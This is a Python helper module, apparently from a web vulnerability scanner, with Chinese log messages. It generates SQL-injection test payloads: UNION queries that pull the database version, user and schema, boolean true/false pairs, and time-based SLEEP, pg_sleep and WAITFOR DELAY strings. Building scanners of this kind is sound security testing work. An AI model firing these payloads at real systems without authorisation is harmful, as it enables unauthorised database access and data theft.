"""Utility helpers shared by production security modules."""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Iterable, List, Sequence


def log_detection_start(logger: logging.Logger, engine_name: str, target_url: str) -> None:
    """Log a standardized start message for an engine."""

    logger.info("開始 %s 檢測: %s", engine_name, target_url)


def log_detection_error(logger: logging.Logger, context: str, error: Exception) -> None:
    """Log a non-fatal detection error."""

    logger.debug("%s 發生錯誤: %s", context, error)


async def delay_between_requests(duration: float = 0.5) -> None:
    """Async helper to pause between HTTP requests."""

    await asyncio.sleep(duration)


def generate_union_payloads(column_count: int) -> list[str]:
    """Generate UNION-based SQLi payloads for the given column count."""

    info_columns: list[str] = []
    for i in range(column_count):
        if i == 0:
            info_columns.append("@@version")
        elif i == 1:
            info_columns.append("user()")
        elif i == 2:
            info_columns.append("database()")
        else:
            info_columns.append(f"'{i + 1}'")

    columns_str = ",".join(info_columns)

    payloads = [
        f"' UNION SELECT {columns_str}--",
        f"' UNION ALL SELECT {columns_str}--",
        f"') UNION SELECT {columns_str}--",
        f"' UNION SELECT {columns_str}#",
        f"'/**/UNION/**/SELECT/**/{columns_str}--",
        f"' UNION SELECT {columns_str} FROM dual--",
    ]

    null_columns = ",".join(["NULL"] * column_count)
    payloads.extend(
        [
            f"' UNION SELECT {null_columns}--",
            f"' UNION ALL SELECT {null_columns}--",
        ]
    )

    payloads.extend(
        [
            f"' UNION SELECT {columns_str} FROM information_schema.tables LIMIT 1--",
            f"' UNION SELECT {columns_str} FROM pg_tables LIMIT 1--",
            f"' UNION SELECT {columns_str} FROM user_tables WHERE ROWNUM=1--",
        ]
    )

    return payloads


def generate_boolean_payload_pairs() -> list[tuple[str, str]]:
    """Generate boolean SQLi payload pairs (true, false)."""

    return [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("') AND ('1'='1", "') AND ('1'='2"),
        (
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT COUNT(*) FROM users)<0--",
        ),
        (
            "' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
            "' AND ASCII(SUBSTRING((SELECT version()),1,1))>200--",
        ),
    ]


def generate_time_payloads() -> list[tuple[str, float]]:
    """Generate time-based SQLi payloads and their expected delay."""

    return [
        ("'; WAITFOR DELAY '00:00:05'--", 5.0),
        ("'; SELECT SLEEP(5)--", 5.0),
        ("'; SELECT pg_sleep(5)--", 5.0),
        (
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) "
            "AND SLEEP(5)--",
            5.0,
        ),
        ("' UNION SELECT SLEEP(5),2,3--", 5.0),
        (
            "' OR (SELECT 1 FROM dual WHERE 1=1 AND (SELECT 1 FROM (SELECT COUNT(*) FROM dual WHERE 1=1 AND SLEEP(3))x))--",
            3.0,
        ),
        ("'; IF (1=1) WAITFOR DELAY '00:00:03'--", 3.0),
    ]


def extract_keywords(text: str) -> set[str]:
    """Extract simple keyword set used by SQLi comparison logic."""

    return set(re.findall(r"\b[a-zA-Z]{3,}\b", text.lower()))


__all__ = [
    "delay_between_requests",
    "extract_keywords",
    "generate_union_payloads",
    "generate_boolean_payload_pairs",
    "generate_time_payloads",
    "log_detection_start",
    "log_detection_error",
]
